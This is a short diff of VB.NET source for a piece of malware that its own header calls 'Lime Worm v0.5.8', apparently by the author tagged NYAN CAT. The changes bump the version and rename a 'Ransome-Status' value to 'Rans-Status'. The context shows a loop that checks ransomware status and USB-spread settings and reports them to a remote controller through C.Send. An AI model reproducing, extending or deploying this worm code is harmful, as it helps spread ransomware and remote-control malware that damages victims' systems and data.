@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on May./07/2018        ##
+'##        N Y A N   C A T  |||   Updated on May./08/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.5.8 ..                   ##
+'##                     .. Lime Worm v0.5.8B ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -91,7 +91,7 @@ Public Class C_Main
 
     Private Shared Sub Checking()
         Thread.CurrentThread.Sleep(5000)
-        Dim Old As String = GTV("Ransome-Status")
+        Dim Old As String = GTV("Rans-Status")
         Dim Old2 As String = GTV("USB")
 
 1:
@@ -100,9 +100,9 @@ Public Class C_Main
                 If C.CNT = True Then
                     Thread.CurrentThread.Sleep(3000)
                     'Compare old string with new string            
-                    If Old <> GTV("Ransome-Status").ToString Then
-                        Old = GTV("Ransome-Status")
-                        C.Send("!R" & SPL & GTV("Ransome-Status").ToString)
+                    If Old <> GTV("Rans-Status").ToString Then
+                        Old = GTV("Rans-Status")
+                        C.Send("!R" & SPL & GTV("Rans-Status").ToString)
                     End If
 
                     If C_Settings.USB Then
